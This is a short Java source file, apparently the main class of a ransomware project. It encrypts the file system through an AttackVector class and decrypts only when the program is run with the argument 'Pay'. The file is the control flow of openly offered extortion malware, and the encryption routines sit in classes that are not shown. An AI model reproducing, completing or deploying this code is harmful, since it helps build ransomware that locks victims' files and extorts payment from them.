package Agent;

import Agent.Attack.AttackVector;
import Agent.exceptions.RansomwareException;

public class RansomApplication {

	public static void main(String[] args) throws RansomwareException {

		AttackVector ransomProcess = new AttackVector();
		try {
			ransomProcess.encryptFileSystem();
		} catch (RansomwareException e) {
			throw new RansomwareException("Can not encrypt", e.getCause());
		}
		if (args[0].equals("Pay")) {
			try {
				ransomProcess.decryptFileSystem();
			} catch (RansomwareException e) {
				throw new RansomwareException("Can not decrypt", e.getCause());
			}
		}

	}

}
